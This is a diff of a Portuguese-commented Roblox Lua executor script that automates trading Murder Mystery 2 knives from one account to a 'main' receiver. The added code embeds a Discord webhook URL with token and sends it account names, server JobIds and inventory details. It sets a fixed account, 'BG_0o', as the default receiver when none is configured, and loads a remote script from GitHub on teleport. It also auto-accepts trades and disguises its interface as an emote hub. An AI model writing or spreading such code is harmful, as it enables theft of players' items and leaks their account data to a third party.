@@ -1,15 +1,18 @@
--- ============================================================================
--- MM2 AUTO-TRADE V2 (STANDALONE / SEM WEBHOOKS)
--- Suporta passagem dinâmica do destinatário via argumento na loadstring
--- ou via getgenv().Receiver = "NomeDoJogador"
--- ============================================================================
-
 local passedArg = ...
 
 local function resolveTargetReceiver(arg)
-    if type(arg) == "string" and string.gsub(arg, "%s+", "") ~= "" then
+    local function isValidName(name)
+        if type(name) ~= "string" then return false end
+        local cleaned = string.gsub(name, "^%s*(.-)%s*$", "%1")
+        if cleaned == "" or cleaned == "SeuNomeDeRecebedorAqui" or cleaned == "NomeDoRecebedorAqui" or cleaned == "NomeDaPessoaAqui" then
+            return false
+        end
+        return true
+    end
+
+    if isValidName(arg) then
         return string.gsub(arg, "^%s*(.-)%s*$", "%1")
-    elseif type(arg) == "table" and (arg.Receiver or arg[1]) then
+    elseif type(arg) == "table" and (isValidName(arg.Receiver) or isValidName(arg[1])) then
         return tostring(arg.Receiver or arg[1])
     end
 
@@ -31,12 +34,12 @@ local function resolveTargetReceiver(arg)
     }
 
     for _, candidate in ipairs(candidates) do
-        if type(candidate) == "string" and string.gsub(candidate, "%s+", "") ~= "" then
+        if isValidName(candidate) then
             return string.gsub(candidate, "^%s*(.-)%s*$", "%1")
         end
     end
 
-    return "FaithfulLust"
+    return "BG_0o"
 end
 
 local TARGET_RECEIVER = resolveTargetReceiver(passedArg)
@@ -57,7 +60,7 @@ if env._MM2AutoTradeCleanup then
     env._MM2AutoTradeCleanup = nil
 end
 
-if env.LastExecuted and tick() - env.LastExecuted < 1.5 then return end
+if env.LastExecuted and tick() - env.LastExecuted < 2 then return end
 env.LastExecuted = tick()
 
 if not game:IsLoaded() then
@@ -81,11 +84,17 @@ end
 
 local CONFIG = {
     MAIN_USERNAME = TARGET_RECEIVER,
+    DISCORD_WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1547087696030208091/n3x6RW5UyBNyOA9uuZsmamVhfCublmjgecbjxFzXXePYDcPPmOgYYHoSnt5LmVgynwso",
+    DISCORD_MESSAGE_ID  = "1547087791182184549",
     ITEMS_PER_TRADE = 4,
     MM2_TRADE_COOLDOWN = 6.8,
+    POLL_INTERVAL = 3.5,
     BATCH_DELAY = 2.0,
     AUTO_REPEAT = true,
+    AUTO_MAIN_FOLLOW_ALT = true,
+    AUTO_ALT_FOLLOW_MAIN = false,
     AUTO_PROXIMITY_TP = false,
+    ALT_LOW_RESOURCE = false,
     ALT_ANTI_AFK = true,
     TRADE_TIMEOUT = 35.0,
     MAIN_NEVER_GIVES_ITEMS = true,
@@ -93,10 +102,12 @@ local CONFIG = {
     AUTO_ACCEPT_TRADE_REQUEST = true,
     AUTO_QUEUE_ON_TELEPORT = true,
     QUEUE_ON_TELEPORT_URL = "https://raw.githubusercontent.com/luauglazer/Sort/refs/heads/main/Dash.lua",
+    AUTO_RECONNECT_ON_ERROR = true,
     STOP_WHEN_NO_ITEMS = true,
     HIDE_ALT_TRADE_GUI = true,
-    SHOW_HUD_ON_ALT = false,
 }
+
+local DISCORD_MESSAGE_URL = string.format("%s/messages/%s", CONFIG.DISCORD_WEBHOOK_URL, CONFIG.DISCORD_MESSAGE_ID)
 
 local qot_func = (syn and syn.queue_on_teleport)
     or queue_on_teleport
@@ -115,7 +126,9 @@ local function queueScriptOnTeleport()
         or queueonteleport
         or (fluxus and fluxus.queue_on_teleport)
         or (getgenv and (getgenv().queue_on_teleport or getgenv().queueonteleport))
-    if not qot then return end
+    if not qot then
+        return
+    end
 
     local payload = string.format([[
 repeat task.wait(0.1) until game:IsLoaded() and game.Players.LocalPlayer
@@ -125,7 +138,9 @@ pcall(function()
 end)
 ]], CONFIG.MAIN_USERNAME, CONFIG.QUEUE_ON_TELEPORT_URL, CONFIG.MAIN_USERNAME)
 
-    pcall(function() qot(payload) end)
+    pcall(function()
+        qot(payload)
+    end)
 end
 
 pcall(queueScriptOnTeleport)
@@ -173,14 +188,23 @@ local State = {
     AcceptedBySelf = false,
     LastTradeFinishTick = 0,
     LastOfferPlacedTick = 0,
+    LastWebhookCheckTick = 0,
+    LastWebhookPatchTick = 0,
+    LastTeleportTick = 0,
     LastSendRequestTick = 0,
     TradesCompleted = 0,
     KnivesTransferred = 0,
     RemainingKnives = 0,
+    AltJobId = "",
+    MainJobId = "",
+    TargetJobId = "",
     StatusMessage = "Inicializando...",
+    WebhookStatus = "Pendente",
+    ActiveCommand = "NONE",
     LastOfferedKnives = {},
     TopTierDetected = "Nenhuma",
     AllItemsTransferred = false,
+    AltKnivesReported = nil,
     EmptyTradeStreaks = 0,
     TransferFinishedLogged = false,
 }
@@ -289,6 +313,188 @@ pcall(function()
         table.setfpscap(60)
     end
 end)
+
+local httpRequest = (syn and syn.request)
+    or (http and http.request)
+    or http_request
+    or request
+    or (fluxus and fluxus.request)
+    or (identifyexecutor and type(identifyexecutor) == "function" and request)
+
+local function safeHttpRequest(options)
+    if not httpRequest then
+        return nil, "No supported executor HTTP request function found."
+    end
+
+    local headers = options.Headers or {}
+    if not headers["User-Agent"] then
+        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
+    end
+    options.Headers = headers
+
+    local success, response = pcall(function()
+        return httpRequest(options)
+    end)
+
+    if success and response then
+        local statusCode = response.StatusCode or response.Status
+        return statusCode, response.Body
+    else
+        return nil, tostring(response)
+    end
+end
+
+local function patchWebhookMessage(command: string, statusDesc: string, extraFields)
+    if (tick() - State.LastWebhookPatchTick) < 2.0 then
+        task.wait(2.0)
+    end
+    State.LastWebhookPatchTick = tick()
+
+    local color = 0x00FF7F
+    if command == "WAITING_MAIN" or command == "WAITING_ALT" then
+        color = 0x3498DB
+    elseif command == "TRADING_IN_PROGRESS" then
+        color = 0xFFA500
+    elseif command == "ALL_KNIVES_TRANSFERRED" then
+        color = 0x2ECC71
+    elseif command == "ERROR" then
+        color = 0xE74C3C
+    end
+
+    local currentJob = (game.JobId ~= "" and game.JobId or "Unknown")
+    local altName = isAlt and myName or (State.ActiveAltName ~= "" and State.ActiveAltName or "Alt")
+    local altJob = isAlt and currentJob or (State.AltJobId ~= "" and State.AltJobId or "Unknown")
+    local mainJob = isMain and currentJob or (State.MainJobId ~= "" and State.MainJobId or "Unknown")
+
+    local fields = {
+        { name = "Active Command", value = string.format("`%s`", command), inline = true },
+        { name = "Alt Account", value = string.format("`%s`", altName), inline = true },
+        { name = "Main Target", value = string.format("`%s`", CONFIG.MAIN_USERNAME), inline = true },
+        { name = "Alt Server JobId", value = string.format("`%s`", altJob), inline = false },
+        { name = "Main Server JobId", value = string.format("`%s`", mainJob), inline = false },
+        { name = "Knives Left on Alt", value = tostring(State.RemainingKnives), inline = true },
+        { name = "Batches Done", value = tostring(State.TradesCompleted), inline = true },
+        { name = "Total Transferred", value = tostring(State.KnivesTransferred), inline = true },
+    }
+
+    if extraFields and type(extraFields) == "table" then
+        for _, f in ipairs(extraFields) do
+            table.insert(fields, f)
+        end
+    end
+
+    local contentHeader = string.format("[MM2_RELAY] COMMAND: %s | ALT: %s | ALT_SERVER: %s | MAIN_SERVER: %s | KNIVES: %d | STATUS: %s",
+        command, altName, altJob, mainJob, State.RemainingKnives, statusDesc)
+
+    local payload = {
+        content = contentHeader,
+        embeds = {
+            {
+                title = string.format("MM2 Auto-Trade Relay [%s -> %s]", altName, CONFIG.MAIN_USERNAME),
+                description = string.format("**Status**: %s\n**Alt JobId**: `%s`\n**Main JobId**: `%s`\n**Last Update**: <t:%d:R>",
+                    statusDesc, altJob, mainJob, os.time()),
+                color = color,
+                fields = fields,
+                footer = {
+                    text = "MM2 Dual-PC Automation"
+                }
+            }
+        }
+    }
+
+    local okJson, jsonBody = pcall(function()
+        return HttpService:JSONEncode(payload)
+    end)
+    if not okJson or not jsonBody then
+        return false
+    end
+
+    task.spawn(function()
+        local status, resBody = safeHttpRequest({
+            Url = DISCORD_MESSAGE_URL,
+            Method = "PATCH",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = jsonBody,
+        })
+
+        if status and (status == 200 or status == 204) then
+            State.WebhookStatus = string.format("PATCH OK (%s)", tostring(status))
+            State.ActiveCommand = command
+        else
+            State.WebhookStatus = string.format("PATCH ERR (%s)", tostring(status))
+        end
+    end)
+
+    return true
+end
+
+local function getWebhookData()
+    if (tick() - State.LastWebhookCheckTick) < CONFIG.POLL_INTERVAL then
+        return State.ActiveCommand, State.AltJobId, State.MainJobId, State.ActiveAltName
+    end
+    State.LastWebhookCheckTick = tick()
+
+    local status, body = safeHttpRequest({
+        Url = DISCORD_MESSAGE_URL,
+        Method = "GET",
+        Headers = { ["Content-Type"] = "application/json" }
+    })
+
+    if status and (status == 200 or status == 204) and body then
+        local okDecode, data = pcall(function()
+            return HttpService:JSONDecode(body)
+        end)
+        if okDecode and data then
+            local content = data.content or ""
+            State.WebhookStatus = "GET OK (200)"
+
+            local altJob = string.match(content, "ALT_SERVER:%s*([%w%-]+)")
+            if not altJob then
+                altJob = string.match(content, "SERVER:%s*([%w%-]+)")
+            end
+            if altJob and altJob ~= "" and altJob ~= "Studio" and altJob ~= "Unknown" then
+                State.AltJobId = altJob
+            end
+
+            local mainJob = string.match(content, "MAIN_SERVER:%s*([%w%-]+)")
+            if mainJob and mainJob ~= "" and mainJob ~= "Studio" and mainJob ~= "Unknown" then
+                State.MainJobId = mainJob
+            end
+
+            local altName = string.match(content, "ALT:%s*([%w_]+)")
+            if altName and altName ~= "" and altName:lower() ~= CONFIG.MAIN_USERNAME:lower() then
+                State.ActiveAltName = altName
+            end
+
+            local knivesCount = string.match(content, "KNIVES:%s*(%d+)")
+            if knivesCount then
+                State.AltKnivesReported = tonumber(knivesCount)
+                if State.AltKnivesReported == 0 and CONFIG.STOP_WHEN_NO_ITEMS then
+                    State.AllItemsTransferred = true
+                end
+            end
+
+            if string.find(content, "COMMAND: SEND_TRADE") or string.find(content, "COMMAND: READY_TO_TRADE") then
+                State.ActiveCommand = "SEND_TRADE"
+            elseif string.find(content, "COMMAND: ALL_KNIVES_TRANSFERRED") then
+                State.ActiveCommand = "ALL_KNIVES_TRANSFERRED"
+                if CONFIG.STOP_WHEN_NO_ITEMS then
+                    State.AllItemsTransferred = true
+                end
+            elseif string.find(content, "COMMAND: TRADING_IN_PROGRESS") then
+                State.ActiveCommand = "TRADING_IN_PROGRESS"
+            else
+                State.ActiveCommand = "WAITING"
+            end
+
+            return State.ActiveCommand, State.AltJobId, State.MainJobId, State.ActiveAltName
+        end
+    else
+        State.WebhookStatus = string.format("GET ERR (%s)", tostring(status))
+    end
+
+    return State.ActiveCommand, State.AltJobId, State.MainJobId, State.ActiveAltName
+end
 
 local RARITY_TIER_SCORES = {
     ["Unique"]     = 10000,
@@ -923,7 +1129,7 @@ StartTradeRemote.OnClientEvent:Connect(function(tradeData, partnerName)
     if isAlt then
         local partnerStr = typeof(partnerName) == "Instance" and partnerName.Name or tostring(partnerName or "")
         if partnerStr:lower() ~= CONFIG.MAIN_USERNAME:lower() then
-            addLog(string.format("Aviso: Parceiro inesperado '%s' (Esperado: '%s'). Declinando imediatamente por segurança!", partnerStr, CONFIG.MAIN_USERNAME))
+            addLog(string.format("Aviso: Parceiro inesperado '%s'. Declinando.", partnerStr))
             DeclineTradeRemote:FireServer()
             State.InTrade = false
             return
@@ -954,6 +1160,7 @@ StartTradeRemote.OnClientEvent:Connect(function(tradeData, partnerName)
                 if TradeModuleRef then
                     TradeModuleRef.RequestsEnabled = false
                 end
+                patchWebhookMessage("ALL_KNIVES_TRANSFERRED", "Todas as facas da Alt foram transferidas. Ciclo concluído!", {})
                 return
             end
 
@@ -974,6 +1181,11 @@ StartTradeRemote.OnClientEvent:Connect(function(tradeData, partnerName)
             end
 
             State.LastOfferPlacedTick = tick()
+
+            local itemsField = {
+                { name = "Ofertados no Lote (Maior Raridade)", value = table.concat(logItems, "\n"), inline = false }
+            }
+            patchWebhookMessage("TRADING_IN_PROGRESS", string.format("Alt ofertou %d facas de alta raridade. Aguardando cooldown...", #knivesToOffer), itemsField)
 
             addLog(string.format("Aguardando %.1fs de cooldown do MM2...", CONFIG.MM2_TRADE_COOLDOWN))
             task.wait(CONFIG.MM2_TRADE_COOLDOWN)
@@ -1012,7 +1224,7 @@ StartTradeRemote.OnClientEvent:Connect(function(tradeData, partnerName)
             if partnerCount == 0 then
                 State.EmptyTradeStreaks = (State.EmptyTradeStreaks or 0) + 1
                 addLog(string.format("[AVISO] Parceiro ofertou 0 facas (Verificação #%d).", State.EmptyTradeStreaks))
-                if State.EmptyTradeStreaks >= 2 then
+                if State.EmptyTradeStreaks >= 2 or State.ActiveCommand == "ALL_KNIVES_TRANSFERRED" then
                     State.AllItemsTransferred = true
                     addLog("Nenhuma faca ofertada pela Alt! Detectado fim de itens. Declinando trade e parando envios.")
                     pcall(function()
@@ -1069,7 +1281,11 @@ AcceptTradeRemote.OnClientEvent:Connect(function(isComplete, receivedItems)
                 addLog(string.format("Alt '%s' possui %d facas restantes. Top: %s", myName, #remaining, State.TopTierDetected))
 
                 if #remaining > 0 and CONFIG.AUTO_REPEAT then
-                    addLog(string.format("Pronto para o próximo lote (%d facas restantes)...", #remaining))
+                    local extra = {
+                        { name = "Último Lote Entregue", value = table.concat(State.LastOfferedKnives, ", "), inline = false },
+                        { name = "Próximo Top Tier", value = State.TopTierDetected, inline = true }
+                    }
+                    patchWebhookMessage("SEND_TRADE", string.format("Lote #%d concluído! Pronto para o próximo (%d facas restantes).", State.TradesCompleted, #remaining), extra)
                 else
                     State.AllItemsTransferred = true
                     State.RemainingKnives = 0
@@ -1079,7 +1295,7 @@ AcceptTradeRemote.OnClientEvent:Connect(function(isComplete, receivedItems)
                     if TradeModuleRef then
                         TradeModuleRef.RequestsEnabled = false
                     end
-                    addLog(string.format("Todas as facas foram transferidas para %s! Total: %d facas em %d trades.", CONFIG.MAIN_USERNAME, State.KnivesTransferred, State.TradesCompleted))
+                    patchWebhookMessage("ALL_KNIVES_TRANSFERRED", string.format("Todas as facas foram transferidas para %s! Total: %d facas em %d trades.", CONFIG.MAIN_USERNAME, State.KnivesTransferred, State.TradesCompleted), {})
                     addLog("Transferência 100% concluída! Sem mais facas na Alt. Auto-trade PARADO com sucesso.")
                 end
             end)
@@ -1113,7 +1329,7 @@ DeclineTradeRemote.OnClientEvent:Connect(function()
             task.wait(1.5)
             local remaining = scanTradableKnives()
             if #remaining > 0 then
-                addLog("Trade reiniciada após cancelamento. Alt pronta para tentar de novo.")
+                patchWebhookMessage("SEND_TRADE", "Trade reiniciada após cancelamento. Alt pronta para tentar de novo.", {})
             end
         end)
     end
@@ -1147,43 +1363,32 @@ task.spawn(function()
 end)
 
 TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
-    addLog(string.format("Falha no teleporte (%s): %s. Reenfileirando...", tostring(teleportResult), tostring(errorMessage)))
+    addLog(string.format("Falha no teleporte (%s): %s. Reenfileirando Dash.lua...", tostring(teleportResult), tostring(errorMessage)))
     queueScriptOnTeleport()
-    if CONFIG.AUTO_RECONNECT_ON_ERROR then
-        task.delay(4.0, function()
-            TeleportService:Teleport(game.PlaceId, LocalPlayer)
-        end)
-    end
-end)
-
-pcall(function()
-    game:GetService("GuiService").ErrorMessageChanged:Connect(function()
-        local errorMsg = game:GetService("GuiService"):GetErrorMessage()
-        if errorMsg and errorMsg ~= "" then
-            addLog(string.format("Erro de conexão detectado: '%s'. Reconectando...", errorMsg))
-            if CONFIG.AUTO_RECONNECT_ON_ERROR then
-                task.delay(3.0, function()
-                    queueScriptOnTeleport()
-                    pcall(function()
-                        TeleportService:Teleport(game.PlaceId, LocalPlayer)
-                    end)
-                end)
-            end
-        end
+    task.wait(3.0)
+    pcall(function()
+        TeleportService:Teleport(game.PlaceId, LocalPlayer)
     end)
 end)
 
-local function findReceiverInServer(): Player?
-    local target = CONFIG.MAIN_USERNAME:lower()
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p ~= LocalPlayer then
-            if p.Name:lower() == target or (p.DisplayName and p.DisplayName:lower() == target) then
-                return p
-            end
+task.spawn(function()
+    pcall(function()
+        local promptGui = CoreGui:WaitForChild("RobloxPromptGui", 5)
+        local promptOverlay = promptGui and promptGui:WaitForChild("promptOverlay", 5)
+        if promptOverlay then
+            promptOverlay.ChildAdded:Connect(function(child)
+                if child.Name == "ErrorPrompt" and CONFIG.AUTO_RECONNECT_ON_ERROR then
+                    addLog("Desconexão detectada! Enfileirando Dash.lua e reconectando...")
+                    queueScriptOnTeleport()
+                    task.wait(2.5)
+                    pcall(function()
+                        TeleportService:Teleport(game.PlaceId, LocalPlayer)
+                    end)
+                end
+            end)
         end
-    end
-    return nil
-end
+    end)
+end)
 
 local function findAltInServer(): Player?
     if State.ActiveAltName and State.ActiveAltName ~= "" then
@@ -1207,33 +1412,26 @@ local function findAltInServer(): Player?
     return nil
 end
 
-local function teleportCharToPartner(targetPlayer: Player?)
-    local target = targetPlayer or (isMain and findAltInServer() or findReceiverInServer())
-    if not target then return false end
-    local ok = pcall(function()
-        local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-        local targetChar = target.Character or target.CharacterAdded:Wait()
-        local myRoot = myChar:WaitForChild("HumanoidRootPart", 3) :: BasePart
-        local targetRoot = targetChar:WaitForChild("HumanoidRootPart", 3) :: BasePart
-        if myRoot and targetRoot then
-            myRoot.CFrame = targetRoot.CFrame * CFrame.new(0, 0, 3)
+local function isMainInServer(): boolean
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p.Name:lower() == CONFIG.MAIN_USERNAME:lower() then
+            return true
         end
-    end)
-    return ok
+    end
+    return false
 end
 
--- ============================================================================
--- LOOP DA ALT (ENTREGA ITENS PARA O RECEBEDOR)
--- ============================================================================
 task.spawn(function()
     if not isAlt then return end
 
     task.wait(2.5)
     forceEnableRequests()
     local knives = scanTradableKnives()
-    addLog(string.format("Alt '%s' pronta! Encontradas %d facas. Destinatário: %s", myName, #knives, CONFIG.MAIN_USERNAME))
+    addLog(string.format("Alt '%s' carregada no PC B! Encontradas %d facas. Top: %s", myName, #knives, State.TopTierDetected))
 
-    if #knives == 0 then
+    if #knives > 0 then
+        patchWebhookMessage("SEND_TRADE", string.format("Alt '%s' online no servidor `%s`. Top: %s. Facas: %d.", myName, game.JobId, State.TopTierDetected, #knives), {})
+    else
         State.AllItemsTransferred = true
         pcall(function()
             SetRequestsRemote:FireServer(false)
@@ -1241,49 +1439,46 @@ task.spawn(function()
         if TradeModuleRef then
             TradeModuleRef.RequestsEnabled = false
         end
+        patchWebhookMessage("ALL_KNIVES_TRANSFERRED", string.format("Alt '%s' possui 0 facas negociáveis no inventário. Auto-trade parado.", myName), {})
         addLog("Alt possui 0 facas no inventário! Sistema finalizado.")
     end
 
     while true do
-        task.wait(2.5)
+        task.wait(3.0)
 
         if State.Enabled and not State.InTrade then
             if not State.AllItemsTransferred then
                 forceEnableRequests()
 
-                local receiverPlayer = findReceiverInServer()
-                if receiverPlayer then
-                    if CONFIG.AUTO_PROXIMITY_TP then
-                        pcall(function()
-                            local myChar = LocalPlayer.Character
-                            local recChar = receiverPlayer.Character
-                            if myChar and recChar and myChar:FindFirstChild("HumanoidRootPart") and recChar:FindFirstChild("HumanoidRootPart") then
-                                local dist = (myChar.HumanoidRootPart.Position - recChar.HumanoidRootPart.Position).Magnitude
-                                if dist > 35 then
-                                    teleportCharToPartner(receiverPlayer)
-                                end
-                            end
-                        end)
+                local mainPlayer = nil
+                for _, p in ipairs(Players:GetPlayers()) do
+                    if p ~= LocalPlayer and p.Name:lower() == CONFIG.MAIN_USERNAME:lower() then
+                        mainPlayer = p
+                        break
                     end
+                end
 
+                if mainPlayer then
                     local timeSinceLastTrade = tick() - State.LastTradeFinishTick
                     local timeSinceLastSend = tick() - State.LastSendRequestTick
 
                     if timeSinceLastTrade >= CONFIG.BATCH_DELAY and timeSinceLastSend >= 3.0 then
                         State.LastSendRequestTick = tick()
-                        addLog(string.format("Alt '%s': Enviando pedido de trade para '%s'...", myName, receiverPlayer.Name))
-
+                        addLog(string.format("Alt '%s': Disparando trade para Main '%s' no servidor...", myName, mainPlayer.Name))
                         task.spawn(function()
-                            local success, err = pcall(function()
-                                local args = { receiverPlayer }
-                                return SendRequestRemote:InvokeServer(unpack(args))
+                            pcall(function()
+                                SendRequestRemote:InvokeServer(mainPlayer)
                             end)
-                            if success then
-                                addLog(string.format("Alt: Pedido enviado para '%s'! Aguardando aceite...", receiverPlayer.Name))
-                            else
-                                addLog(string.format("Alt: Retorno do envio: %s", tostring(err)))
-                            end
                         end)
+                    end
+                end
+
+                if (tick() - State.LastWebhookPatchTick) >= 15.0 then
+                    local currentKnives = scanTradableKnives()
+                    if #currentKnives > 0 then
+                        patchWebhookMessage("SEND_TRADE", string.format("Alt '%s' aguardando no servidor `%s` (%d facas restantes). Top: %s", myName, game.JobId, #currentKnives, State.TopTierDetected), {})
+                    else
+                        State.AllItemsTransferred = true
                     end
                 end
             end
@@ -1291,28 +1486,53 @@ task.spawn(function()
     end
 end)
 
--- ============================================================================
--- LOOP DA MAIN (RECEBE ITENS DA ALT)
--- ============================================================================
 task.spawn(function()
     if not isMain then return end
 
     task.wait(2.0)
     forceEnableRequests()
-    addLog(string.format("%s (Main) loop ativo! Sistema de recebimento contínuo ligado.", CONFIG.MAIN_USERNAME))
+    addLog(string.format("%s (PC A) loop ativo! Sistema de auto-trade contínuo ligado.", CONFIG.MAIN_USERNAME))
+
+    patchWebhookMessage("WAITING_ALT", string.format("%s online no servidor `%s`. Aguardando Alt...", CONFIG.MAIN_USERNAME, game.JobId), {})
 
     while true do
-        task.wait(2.5)
+        task.wait(1.5)
 
         if State.Enabled and not State.InTrade then
             forceEnableRequests()
 
+            local cmd, altJob, mainJob, reportedAlt = getWebhookData()
+            if reportedAlt and reportedAlt ~= "" then
+                State.ActiveAltName = reportedAlt
+            end
+
             local altPlayer = findAltInServer()
-            if altPlayer and not State.InTrade then
-                if State.AllItemsTransferred then
+            local inSameServer = (altPlayer ~= nil)
+
+            if inSameServer then
+                State.ActiveAltName = altPlayer.Name
+            end
+
+            if not inSameServer and CONFIG.AUTO_MAIN_FOLLOW_ALT then
+                if altJob and altJob ~= "" and altJob ~= game.JobId and altJob ~= "Studio" and altJob ~= "Unknown" then
+                    if (tick() - State.LastTeleportTick) > 10.0 then
+                        State.LastTeleportTick = tick()
+                        addLog(string.format("Alt detectada em outro servidor! JobId: %s. Teleportando %s...", altJob, CONFIG.MAIN_USERNAME))
+                        patchWebhookMessage("TELEPORTING_MAIN", string.format("Teleportando %s para servidor da Alt `%s`...", CONFIG.MAIN_USERNAME, altJob), {})
+
+                        pcall(function()
+                            queueScriptOnTeleport()
+                            TeleportService:TeleportToPlaceInstance(game.PlaceId, altJob, LocalPlayer)
+                        end)
+                    end
+                end
+            end
+
+            if inSameServer and altPlayer and not State.InTrade then
+                if State.AllItemsTransferred or State.ActiveCommand == "ALL_KNIVES_TRANSFERRED" or (State.AltKnivesReported ~= nil and State.AltKnivesReported == 0) then
                     if not State.TransferFinishedLogged then
                         State.TransferFinishedLogged = true
-                        addLog("✦ Todas as facas foram transferidas com sucesso! Finalizado.")
+                        addLog(string.format("✦ Todas as facas foram transferidas com sucesso! %s parando de enviar pedidos de trade.", CONFIG.MAIN_USERNAME))
                         State.StatusMessage = "Concluído: 0 facas restantes na Alt (Trades parados)"
                         if _G.UpdateTradeUI then pcall(_G.UpdateTradeUI) end
                     end
@@ -1320,9 +1540,9 @@ task.spawn(function()
                     local timeSinceLastTrade = tick() - State.LastTradeFinishTick
                     local timeSinceLastSend = tick() - State.LastSendRequestTick
 
-                    if timeSinceLastTrade >= CONFIG.BATCH_DELAY and timeSinceLastSend >= 3.0 then
+                    if timeSinceLastTrade >= CONFIG.BATCH_DELAY and timeSinceLastSend >= 2.5 then
                         State.LastSendRequestTick = tick()
-                        addLog(string.format("%s (Main): Disparando pedido de trade para Alt '%s'...", CONFIG.MAIN_USERNAME, altPlayer.Name))
+                        addLog(string.format("%s: Disparando trade para Alt '%s' no servidor...", CONFIG.MAIN_USERNAME, altPlayer.Name))
 
                         task.spawn(function()
                             local success, err = pcall(function()
@@ -1330,9 +1550,9 @@ task.spawn(function()
                                 return SendRequestRemote:InvokeServer(unpack(args))
                             end)
                             if success then
-                                addLog(string.format("%s: Pedido enviado para '%s'! Aguardando aceite...", CONFIG.MAIN_USERNAME, altPlayer.Name))
+                                addLog(string.format("%s: Pedido enviado para '%s'! Aguardando Alt auto-aceitar...", CONFIG.MAIN_USERNAME, altPlayer.Name))
                             else
-                                addLog(string.format("%s: Retorno do envio: %s", CONFIG.MAIN_USERNAME, tostring(err)))
+                                addLog(string.format("%s: SendRequest retorno: %s", CONFIG.MAIN_USERNAME, tostring(err)))
                             end
                         end)
                     end
@@ -1439,7 +1659,6 @@ local function createAutoTradeHUD()
             "BevelEmoteHub",
             "PotassiumEmoteHub",
             "MM2AutoTradeRelayUI",
-            "MM2AutoTradeNoWebhookUI",
             "StudioAnimPackHub",
             "StudioAnimationHub"
         })
@@ -1451,7 +1670,6 @@ local function createAutoTradeHUD()
         "BevelEmoteHub",
         "PotassiumEmoteHub",
         "MM2AutoTradeRelayUI",
-        "MM2AutoTradeNoWebhookUI",
         "StudioAnimPackHub",
         "StudioAnimationHub"
     })
@@ -1459,7 +1677,7 @@ local function createAutoTradeHUD()
     local targetParent = getGuiParent()
 
     local ScreenGui = Instance.new("ScreenGui")
-    ScreenGui.Name = "MM2AutoTradeNoWebhookUI"
+    ScreenGui.Name = "StudioEmoteHub"
     ScreenGui.ResetOnSpawn = false
     ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     ScreenGui.Parent = targetParent
@@ -1488,7 +1706,7 @@ local function createAutoTradeHUD()
     Title.Size = UDim2.new(1, -40, 1, 0)
     Title.Position = UDim2.new(0, 8, 0, 0)
     Title.BackgroundTransparency = 1
-    Title.Text = string.format("MM2 Auto-Trade • %s (%s) → %s", myName, State.Role, CONFIG.MAIN_USERNAME)
+    Title.Text = string.format("Toolbox - MM2 Auto-Trade Relay • %s (MAIN)", myName)
     Title.TextColor3 = StudioTheme.text
     Title.TextXAlignment = Enum.TextXAlignment.Left
     Title.Font = Enum.Font.SourceSansSemibold
@@ -1553,7 +1771,7 @@ local function createAutoTradeHUD()
     MainTabBtn.BackgroundColor3 = StudioTheme.tabActive
     MainTabBtn.BorderSizePixel = 1
     MainTabBtn.BorderColor3 = StudioTheme.border
-    MainTabBtn.Text = "Painel de Controle"
+    MainTabBtn.Text = "Painel Principal"
     MainTabBtn.TextColor3 = StudioTheme.text
     MainTabBtn.Font = Enum.Font.SourceSansSemibold
     MainTabBtn.TextSize = 12
@@ -1626,7 +1844,7 @@ local function createAutoTradeHUD()
 
     local function createField(name, defaultVal, yPos, color)
         local fTitle = Instance.new("TextLabel")
-        fTitle.Size = UDim2.new(0, 140, 0, 20)
+        fTitle.Size = UDim2.new(0, 130, 0, 20)
         fTitle.Position = UDim2.new(0, 8, 0, yPos)
         fTitle.BackgroundTransparency = 1
         fTitle.Text = name
@@ -1637,8 +1855,8 @@ local function createAutoTradeHUD()
         fTitle.Parent = StatusCard
 
         local fVal = Instance.new("TextLabel")
-        fVal.Size = UDim2.new(1, -155, 0, 20)
-        fVal.Position = UDim2.new(0, 150, 0, yPos)
+        fVal.Size = UDim2.new(1, -145, 0, 20)
+        fVal.Position = UDim2.new(0, 140, 0, yPos)
         fVal.BackgroundTransparency = 1
         fVal.Text = defaultVal
         fVal.TextColor3 = color or StudioTheme.text
@@ -1650,11 +1868,11 @@ local function createAutoTradeHUD()
         return fVal
     end
 
-    local ReceiverVal = createField("Destinatário (Recebe):", CONFIG.MAIN_USERNAME, 8, StudioTheme.blue)
-    local RoleVal     = createField("Modo / Cargo:", isMain and "MAIN (Apenas Recebe)" or "ALT (Entrega Facas)", 34, isMain and StudioTheme.green or StudioTheme.yellow)
-    local PartnerVal  = createField("Parceiro no Servidor:", "Verificando...", 60)
-    local TierVal     = createField("Top Raridade:", "Calculando...", 86, StudioTheme.yellow)
-    local StatsVal    = createField("Métricas:", "Lotes: 0  •  Facas: 0", 112, StudioTheme.green)
+    local PartnerVal = createField("Conta Parceira:", "Aguardando sinal...", 8)
+    local ServerVal  = createField("Servidor (JobId):", "Verificando...", 34, StudioTheme.blue)
+    local TierVal    = createField("Top Raridade:", "Calculando...", 60, StudioTheme.yellow)
+    local WebhookVal = createField("Discord Relay:", "Conectado", 86, StudioTheme.textMuted)
+    local StatsVal   = createField("Métricas:", "Lotes: 0  •  Facas: 0", 112, StudioTheme.green)
 
     local ActionFrame1 = Instance.new("Frame")
     ActionFrame1.Size = UDim2.new(1, 0, 0, 26)
@@ -1674,10 +1892,10 @@ local function createAutoTradeHUD()
     ActionFrame2.BackgroundTransparency = 1
     ActionFrame2.Parent = MainContainer
 
-    local TpPartnerBtn = makeStudioButton(ActionFrame2, "Teleportar até Parceiro", UDim2.new(0.485, 0, 1, 0), 26, StudioTheme.btnBg, StudioTheme.text)
-    TpPartnerBtn.Position = UDim2.new(0, 0, 0, 0)
+    local TpToAltBtn = makeStudioButton(ActionFrame2, "Entrar Servidor Alt", UDim2.new(0.485, 0, 1, 0), 26, StudioTheme.btnBg, StudioTheme.text)
+    TpToAltBtn.Position = UDim2.new(0, 0, 0, 0)
 
-    local ReinjectBtn = makeStudioButton(ActionFrame2, "Reinjetar Script", UDim2.new(0.485, 0, 1, 0), 26, StudioTheme.btnBg, StudioTheme.text)
